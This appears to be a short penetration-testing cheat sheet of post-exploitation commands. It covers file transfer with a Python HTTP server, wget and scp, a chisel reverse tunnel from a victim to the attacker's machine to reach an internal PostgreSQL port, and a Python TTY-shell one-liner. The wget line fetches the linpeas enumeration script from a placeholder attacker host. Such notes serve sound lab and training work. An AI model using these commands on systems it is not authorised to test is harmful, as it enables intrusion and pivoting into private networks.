# General Commands

### Python server

`python3 -m http.server 8888`

To download the file: `wget http:/KALI_IP//linpeas.sh`

### SCP

Copy file from local to a remote computer:

```bash
scp file.txt remote_username@10.10.0.2:/remote/directory/newfilename.txt
# -P to set the ssh port in necessary case
```

Copy file from remote directory to local computer

```bash
scp remote_username@10.10.0.2:/remote/file.txt /local/directory
```

### Chisel

Example for postgresql (port 5432). First we need to transfer chisel.

On the attacker's machine:

```
chisel server --port 9002 --reverse
```

On the victim's machine:

```
./chisel client -v 10.10.16.81:9002 R:5432:172.22.0.1:5432
```

And now on the atacker's machine we have the ports 5432 connected. The usage wil be on another tab: `psql -h 10.10.16.81 -U "postgres" -p 5432`

``

#### Spawn a TTY Shell

```
python -c 'import pty; pty.spawn("/bin/sh")'
```
